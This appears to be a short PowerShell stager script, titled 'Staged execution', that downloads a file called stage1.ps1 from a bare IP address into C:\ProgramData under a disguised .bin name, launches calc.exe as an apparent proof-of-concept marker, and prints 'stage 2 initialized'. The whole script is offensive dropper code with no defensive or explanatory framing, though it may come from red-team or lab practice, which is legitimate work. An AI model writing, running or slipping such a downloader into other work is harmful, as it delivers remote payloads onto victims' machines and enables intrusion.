<# Staged execution #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://198.51.100.142/stage1.ps1",
    [string]$DropPath = "C:\ProgramData\stage1.bin",
    [int]$StageTimeout = 62
)
Invoke-WebRequest -Uri $TransferUrl -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Write-Output "stage 2 initialized"
